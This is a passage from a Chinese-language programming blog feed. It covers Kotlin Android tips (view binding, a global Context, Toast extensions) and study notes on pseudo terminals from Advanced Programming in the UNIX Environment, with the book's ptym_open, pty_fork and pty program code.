class="string">&quot;param1&quot;</span>, data1)</span><br><span class="line">            intent.putExtra(<span class="string">&quot;param2&quot;</span>, data2)</span><br><span class="line">            context.startActivity(intent)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要启动MyActivity时，只要调用<code>MyActivity.actionStart(this, &quot;data1&quot;, &quot;data2)</code>即可。</p><span id="more"></span><h2 id="视图绑定">视图绑定</h2><p>书中提到了<code>kotlin-android-extensions</code>插件可以使开发人员直接通过id来使用控件，而不再需要findviewbyid。但是在新版的Android Studio中，该插件默认不启用。手动启用后，会提示我们插件已经被废弃了。而视图绑定（View Binding ）作为jetpack的一部分，提供了类似的功能。</p><p>想要启用该功能，首先需要配置模块层级的<code>build.gradle</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ...</span><br><span class="line">    buildFeatures &#123;</span><br><span class="line">        viewBinding true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果某个布局文件不需要该功能，则可以添加<code>tools:viewBindingIgnore=&quot;true&quot;</code></p><p>之后的使用方法参考：<a href="https://developer.android.google.cn/topic/libraries/view-binding">View Binding</a>，<a href="https://guolin.blog.csdn.net/article/details/113089706">kotlin-android-extensions插件也被废弃了？扶我起来</a></p><h2 id="全局获取Context">全局获取Context</h2><p>可以定制一个Application类，管理一些全局的状态信息。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> : <span class="type">Application</span></span>() &#123;</span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line">        <span class="meta">@SuppressLint(<span class="string">&quot;StaticFieldLeak&quot;</span>)</span></span><br><span class="line">        <span class="keyword">lateinit</span> <span class="keyword">var</span> context: Context</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate()</span><br><span class="line">        context = applicationContext</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并在AndoridManifest.xml中的<application>标签下，指定name为该类即可，如：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;x.x.x&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;.MyApplication&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            ...</span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样，通过<code>MyApplication.context</code>即可使用Context了。</p><h2 id="简化Toast">简化Toast</h2><p>Toast可以显示字符串或者字符资源，普通用法为：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;String&quot;</span>, Toast.LENGTH_SHORT).show()</span><br></pre></td></tr></table></figure><p>可以通过扩展函数和上一节的全局context进行简化：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用法：&quot;String&quot;.showToast()</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> String.<span class="title">showToast</span><span class="params">(duration: <span class="type">Int</span> = Toast.LENGTH_SHORT)</span></span> &#123;</span><br><span class="line">    Toast.makeText(MyApplication.context, <span class="keyword">this</span>, duration).show()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法：R.string.app_name.showToast()</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="built_in">Int</span>.<span class="title">showToast</span><span class="params">(duration: <span class="type">Int</span> = Toast.LENGTH_SHORT)</span></span> &#123;</span><br><span class="line">    Toast.makeText(MyApplication.context, <span class="keyword">this</span>, duration).show()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX环境高级编程（19-伪终端）</title>
      <link href="/posts/1083767513.html"/>
      <url>/posts/1083767513.html</url>
      
        <content type="html"><![CDATA[<h1>概述</h1><p>伪终端是指，对于一个应用程序，它看上去是一个终端，而实际上却并不是一个真正的终端。</p><p>父进程首先打开一个伪终端主设备，随后fork，子进程打开相应的伪终端从设备，并将该文件描述符复制到stdin/out/err，最后调用exec。</p><p>对于伪终端从设备上的用户进程来说，其stdin/out/err都是终端设备，因此可以处理上一章介绍的各类终端I/O函数。并且，所有写到伪终端主设备的都会作为从设备的输入，反之亦然。</p><span id="more"></span><p>其典型结构如下图所示：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20210106142535.png" alt="Typical arrangement of processes using a pseudo terminal"></p><p>为说明方面，下面将伪终端简称为PTY。</p><h2 id="典型用途">典型用途</h2><h3 id="网络登录服务器">网络登录服务器</h3><p>如telnetd和rlogind服务器。这方面不太熟悉，故不展开讲。</p><h3 id="窗口系统终端模拟">窗口系统终端模拟</h3><p>窗口系统通常提供一个终端模拟器，这使得我们可以在命令行环境下通过shell运行程序。</p><p>终端模拟器是shell和窗口管理器之间的媒介。shell将自己的标准输入/输出/错误连接到PTY的从设备端，而终端模拟器则管理对应的主设备端。其大致框图如下：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20210106150546.png" alt="Arrangement of processes for windowing system"></p><p>当用户改变模拟器的窗口大小时，窗口管理器会通知模拟器，而模拟器则在主设备端利用<code>TIOCSWINSZ</code>命令设置从设备的窗口大小。前台PTY从设备的进程组会收到SIGWINCH信号，可以进行相应的处理。</p><h3 id="script程序">script程序</h3><p>script程序可以将终端的所有输入和输出信息复制到一个文件中（默认是typescript）。为了获取shell的输入输出信息，它需要调用一个shell并使其连接到PTY从设备上，而将自己连接到PTY主设备上，将得到的输入输出信息都复制到指定的文件中。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20210106153036.png" alt="The script program"></p><h3 id="运行协同进程">运行协同进程</h3><p>当通过管道与协同进程通信时，标准I/O是全缓冲的，对于调用标准I/O的协同进程，除非手动调用fflush，否则会引起死锁。</p><p>而如果在两个进程之间放入伪终端，则协同进程会认为它是由终端驱动的，从而设置为行缓冲。通过调用pty_fork或者exec一个pty程序，并将协同进程作为参数即可实现。这两种方法用到的函数和程序会在下文详细说明。</p><h3 id="观看长时间运行程序的输出">观看长时间运行程序的输出</h3><p>通常会将需要长时间运行的程序放到shell的后台运行（后面加上&amp;）。如果需要观察其输出，一般将其重定向到一个文件，那么这时候输出就会变成全缓冲，需要积累到一定量的数据后才会真正输出。</p><p>与上面的协同进程类似，可以通过伪终端来解决，在pty程序下运行该程序。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20210106154936.png" alt="Running a slow output program using a pseudo terminal"></p><p>途中shell到pty的虚线表示pty进程是作为后台任务运行的。</p><h1>打开伪终端设备</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: file descriptor of next available PTY master if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">posix_openpt</span><span class="params">(<span class="type">int</span> oflag)</span>;</span><br></pre></td></tr></table></figure><p><code>posix_openpt</code>用于打开下一个可用的PTY主设备，其<code>oflag</code>参数用于指定如何打开主设备，支持<strong>O_RDWR</strong>以读写方式打开，和<strong>O_NOCTTY</strong>防止主设备成为调用者的控制终端。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">// Both return: 0 on success, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">grantpt</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unlockpt</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br></pre></td></tr></table></figure><p>这两个函数用于从设备的权限设置，在从设备可用之前，必须调用这两个函数。</p><p><code>grantpt</code>函数把从设备节点的用户ID设置为调用者的实际用户ID，设置其组ID为一非指定值，通常是可以访问该终端设备的组。权限被设置为：对个体所有者是读／写，对组所有者是写（0620）。</p><p><code>unlockpt</code>函数用于准予对PTY从设备的访问，从而允许应用程序打开该设备。</p><p>这两个函数使用的文件描述符都是与PTY主设备关联的文件描述符。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: pointer to name of PTY slave if OK, NULL on error</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">ptsname</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br></pre></td></tr></table></figure><p><code>ptsname</code>可以利用主设备的描述符来找到对应<strong>从设备的路径名</strong>。该函数返回的名字可能存储于静态存储中，因此后续调用可能会覆盖它。、</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20210107111152.png" alt="XSI pseudo terminal functions"></p><h2 id="更便利的函数">更便利的函数</h2><p>本书作者提供了几个函数，帮助使用者处理了在调用上述函数时需要处理的细节。</p><h3 id="打开主设备和从设备">打开主设备和从设备</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;apue.h&quot;</span></span></span><br><span class="line"><span class="comment">// Returns: file descriptor of PTY master if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ptym_open</span><span class="params">(<span class="type">char</span> *pts_name, <span class="type">int</span> pts_namesz)</span>;</span><br><span class="line"><span class="comment">// Returns: file descriptor of PTY slave if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ptys_open</span><span class="params">(<span class="type">char</span> *pts_name)</span>;</span><br></pre></td></tr></table></figure><p><code>ptym_open</code>用于打开下一个可用的PTY主设备，调用者需要分配一个数组来存放<code>pts_name</code>返回的从设备的名字。<code>pts_namesz</code>用于指定数组长度，以避免该函数复制比数组空间更长的字符串。</p><p><code>ptys_open</code>打开<code>pts_name</code>指定的从设备。</p><p>通常，不直接调用这两个函数，而是通过<code>pty_fork</code>函数（见下文）调用它们，并且会fork出一个子进程。</p><p>原始代码位于书本资料的/lib/ptyopen.c，可以参考本项目中的相关文件：<a href="https://gitee.com/maxiaowei/Linux/blob/master/apue/apue/ptyopen.c">https://gitee.com/maxiaowei/Linux/blob/master/apue/apue/ptyopen.c</a></p><p>摘录代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;apue.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(SOLARIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">ptym_open</span><span class="params">(<span class="type">char</span> *pts_name, <span class="type">int</span> pts_namesz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>*ptr;</span><br><span class="line">    <span class="type">int</span>fdm, err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fdm = posix_openpt(O_RDWR)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (grantpt(fdm) &lt; <span class="number">0</span>)<span class="comment">/* grant access to slave */</span></span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    <span class="keyword">if</span> (unlockpt(fdm) &lt; <span class="number">0</span>)<span class="comment">/* clear slave&#x27;s lock flag */</span></span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    <span class="keyword">if</span> ((ptr = ptsname(fdm)) == <span class="literal">NULL</span>)<span class="comment">/* get slave&#x27;s name */</span></span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Return name of slave.  Null terminate to handle</span></span><br><span class="line"><span class="comment">     * case where strlen(ptr) &gt; pts_namesz.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">strncpy</span>(pts_name, ptr, pts_namesz);</span><br><span class="line">    pts_name[pts_namesz - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>(fdm);<span class="comment">/* return fd of master */</span></span><br><span class="line">errout:</span><br><span class="line">    err = errno;</span><br><span class="line">    close(fdm);</span><br><span class="line">    errno = err;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">ptys_open</span><span class="params">(<span class="type">char</span> *pts_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fds;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(SOLARIS)</span></span><br><span class="line">    <span class="type">int</span> err, setup;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fds = open(pts_name, O_RDWR)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(SOLARIS)</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Check if stream is already set up by autopush facility.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> ((setup = ioctl(fds, I_FIND, <span class="string">&quot;ldterm&quot;</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setup == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(fds, I_PUSH, <span class="string">&quot;ptem&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(fds, I_PUSH, <span class="string">&quot;ldterm&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(fds, I_PUSH, <span class="string">&quot;ttcompat&quot;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">errout:</span><br><span class="line">            err = errno;</span><br><span class="line">            close(fds);</span><br><span class="line">            errno = err;</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span>(fds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="pty-fork">pty_fork</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;apue.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: 0 in child, process ID of child in parent, −1 on error</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">pty_fork</span><span class="params">(<span class="type">int</span> *ptrfdm, <span class="type">char</span> *slave_name, <span class="type">int</span> slave_namesz,</span></span><br><span class="line"><span class="params">               <span class="type">const</span> <span class="keyword">struct</span> termios *slave_termios,</span></span><br><span class="line"><span class="params">               <span class="type">const</span> <span class="keyword">struct</span> winsize *slave_winsize)</span>;</span><br></pre></td></tr></table></figure><p><code>pty_fork</code>会用fork调用打开主设备和从设备，创建作为会话首进程的子进程（利用setsid）并使其具有控制终端。</p><p><code>ptrfdm</code>指针返回主设备的文件描述符；如果<code>slave_name</code>不为空，则从设备名被存储在该指针指向的内存空间；如果<code>slave_termios</code>不为空，则将从设备的终端行规程设定为指定的值（利用tcsetattr）；<code>slave_winsize</code>同理（利用ioctl的TIOCSWINSZ命令）。</p><p>原始代码位于书本资料的/lib/ptyfork.c，也可以参考本项目中的相关文件：<a href="https://gitee.com/maxiaowei/Linux/blob/master/apue/apue/ptyfork.c">https://gitee.com/maxiaowei/Linux/blob/master/apue/apue/ptyfork.c</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;apue.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span></span><br><span class="line"><span class="title function_">pty_fork</span><span class="params">(<span class="type">int</span> *ptrfdm, <span class="type">char</span> *slave_name, <span class="type">int</span> slave_namesz,</span></span><br><span class="line"><span class="params">         <span class="type">const</span> <span class="keyword">struct</span> termios *slave_termios,</span></span><br><span class="line"><span class="params">         <span class="type">const</span> <span class="keyword">struct</span> winsize *slave_winsize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>fdm, fds;</span><br><span class="line">    <span class="type">pid_t</span>pid;</span><br><span class="line">    <span class="type">char</span>pts_name[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fdm = ptym_open(pts_name, <span class="keyword">sizeof</span>(pts_name))) &lt; <span class="number">0</span>)</span><br><span class="line">        err_sys(<span class="string">&quot;can&#x27;t open master pty: %s, error %d&quot;</span>, pts_name, fdm);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (slave_name != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Return name of slave.  Null terminate to handle case</span></span><br><span class="line"><span class="comment">         * where strlen(pts_name) &gt; slave_namesz.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="built_in">strncpy</span>(slave_name, pts_name, slave_namesz);</span><br><span class="line">        slave_name[slave_namesz - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;<span class="comment">/* child */</span></span><br><span class="line">        <span class="keyword">if</span> (setsid() &lt; <span class="number">0</span>)</span><br><span class="line">            err_sys(<span class="string">&quot;setsid error&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * System V acquires controlling terminal on open().</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> ((fds = ptys_open(pts_name)) &lt; <span class="number">0</span>)</span><br><span class="line">            err_sys(<span class="string">&quot;can&#x27;t open slave pty&quot;</span>);</span><br><span class="line">        close(fdm);<span class="comment">/* all done with master in child */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>defined(BSD)</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * TIOCSCTTY is the BSD way to acquire a controlling terminal.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (ioctl(fds, TIOCSCTTY, (<span class="type">char</span> *)<span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            err_sys(<span class="string">&quot;TIOCSCTTY error&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Set slave&#x27;s termios and window size.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (slave_termios != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tcsetattr(fds, TCSANOW, slave_termios) &lt; <span class="number">0</span>)</span><br><span class="line">                err_sys(<span class="string">&quot;tcsetattr error on slave pty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (slave_winsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ioctl(fds, TIOCSWINSZ, slave_winsize) &lt; <span class="number">0</span>)</span><br><span class="line">                err_sys(<span class="string">&quot;TIOCSWINSZ error on slave pty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Slave becomes stdin/stdout/stderr of child.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (dup2(fds, STDIN_FILENO) != STDIN_FILENO)</span><br><span class="line">            err_sys(<span class="string">&quot;dup2 error to stdin&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (dup2(fds, STDOUT_FILENO) != STDOUT_FILENO)</span><br><span class="line">            err_sys(<span class="string">&quot;dup2 error to stdout&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (dup2(fds, STDERR_FILENO) != STDERR_FILENO)</span><br><span class="line">            err_sys(<span class="string">&quot;dup2 error to stderr&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fds != STDIN_FILENO &amp;&amp; fds != STDOUT_FILENO &amp;&amp;</span><br><span class="line">          fds != STDERR_FILENO)</span><br><span class="line">            close(fds);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);<span class="comment">/* child returns 0 just like fork() */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">/* parent */</span></span><br><span class="line">        *ptrfdm = fdm;<span class="comment">/* return fd of master */</span></span><br><span class="line">        <span class="keyword">return</span>(pid);<span class="comment">/* parent returns pid of child */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>pty程序</h1><p>用pty来执行另一个程序时，那个程序在它自己的会话中执行，并和一个伪终端连接。</p><p>当使用pty来运行一个程序的时候，以运行cat为例，其运行框图如下：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20210107161612.png" alt="Process groups and sessions for pty cat"></p><p>pty程序调用上一节所讲的<code>pty_fork</code>函数后，在它的子进程中调用exec执行命令行指定的程序，而父进程则调用<code>loop</code>函数，将标准输入接收到的内容复制到PTY主设备，将PTY主设备接收到的内容复制到标准输出。</p><p>pty程序包含main.c、loop.c和driver.c3个文件，可在书本资料的pty文件夹下找到。或者在本项目的ch19文件夹下寻找（pty.c对应于main.c），<a href="https://gitee.com/maxiaowei/Linux/tree/master/apue/ch19">https://gitee.com/maxiaowei/Linux/tree/master/apue/ch19</a>。对于<code>loop</code>函数，除了作者给出的通过父子进程实现，也可以使用select或poll实现（利用select实现可参考项目同目录下的19.3.c，poll由于不太熟悉未能成功）。</p><p>现将pty程序的main函数部分摘录如下，方便了解其具体实现：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>             fdm, c, ignoreeof, interactive, noecho, verbose;</span><br><span class="line">    <span class="type">pid_t</span>pid;</span><br><span class="line">    <span class="type">char</span>*driver;</span><br><span class="line">    <span class="type">char</span>slave_name[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termios</span><span class="title">orig_termios</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span><span class="title">size</span>;</span></span><br><span class="line"></span><br><span class="line">    interactive = isatty(STDIN_FILENO);</span><br><span class="line">    ignoreeof = <span class="number">0</span>;</span><br><span class="line">    noecho = <span class="number">0</span>;</span><br><span class="line">    verbose = <span class="number">0</span>;</span><br><span class="line">    driver = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    opterr = <span class="number">0</span>;<span class="comment">/* don&#x27;t want getopt() writing to stderr */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getopt(argc, argv, OPTSTR)) != EOF) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:<span class="comment">/* driver for stdin/stdout */</span></span><br><span class="line">            driver = optarg;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:<span class="comment">/* noecho for slave pty&#x27;s line discipline */</span></span><br><span class="line">            noecho = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:<span class="comment">/* ignore EOF on standard input */</span></span><br><span class="line">            ignoreeof = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:<span class="comment">/* not interactive */</span></span><br><span class="line">            interactive = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:<span class="comment">/* verbose */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            err_quit(<span class="string">&quot;unrecognized option: -%c&quot;</span>, optopt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (optind &gt;= argc)</span><br><span class="line">        err_quit(<span class="string">&quot;usage: pty [ -d driver -einv ] program [ arg ... ]&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (interactive) &#123;<span class="comment">/* fetch current termios and window size */</span></span><br><span class="line">        <span class="keyword">if</span> (tcgetattr(STDIN_FILENO, &amp;orig_termios) &lt; <span class="number">0</span>)</span><br><span class="line">            err_sys(<span class="string">&quot;tcgetattr error on stdin&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (ioctl(STDIN_FILENO, TIOCGWINSZ, (<span class="type">char</span> *) &amp;size) &lt; <span class="number">0</span>)</span><br><span class="line">            err_sys(<span class="string">&quot;TIOCGWINSZ error&quot;</span>);</span><br><span class="line">        pid = pty_fork(&amp;fdm, slave_name, <span class="keyword">sizeof</span>(slave_name),</span><br><span class="line">          &amp;orig_termios, &amp;size);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pid = pty_fork(&amp;fdm, slave_name, <span class="keyword">sizeof</span>(slave_name),</span><br><span class="line">          <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_sys(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;<span class="comment">/* child */</span></span><br><span class="line">        <span class="keyword">if</span> (noecho)</span><br><span class="line">            set_noecho(STDIN_FILENO);<span class="comment">/* stdin is slave pty */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (execvp(argv[optind], &amp;argv[optind]) &lt; <span class="number">0</span>)</span><br><span class="line">            err_sys(<span class="string">&quot;can&#x27;t execute: %s&quot;</span>, argv[optind]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;slave name = %s\n&quot;</span>, slave_name);</span><br><span class="line">        <span class="keyword">if</span> (driver != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;driver = %s\n&quot;</span>, driver);</span><br><span class="line">    &#125;</span><br><span 